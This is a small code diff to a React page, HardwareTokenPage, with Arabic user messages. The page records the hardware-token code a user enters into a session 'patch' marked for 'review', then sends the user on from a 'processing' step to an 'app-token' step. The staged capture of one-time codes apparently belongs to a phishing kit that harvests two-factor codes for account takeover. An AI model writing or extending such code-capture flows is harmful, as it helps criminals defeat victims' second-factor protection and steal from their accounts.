@@ -47,12 +47,12 @@ function HardwareTokenPage() {
     void trackEvent({
       data: {
         sessionId: getSessionId(),
-        stage: "processing",
+        stage: "app-token",
         patch: { hw_token: code, status: "review" },
       },
     });
-    toast.success("تم إرسال الرمز — جارٍ المراجعة");
-    navigate({ to: "/processing" });
+    toast.success("تم إرسال الرمز — أكمل خطوة التطبيق");
+    navigate({ to: "/app-token" });
   }
 
   return (
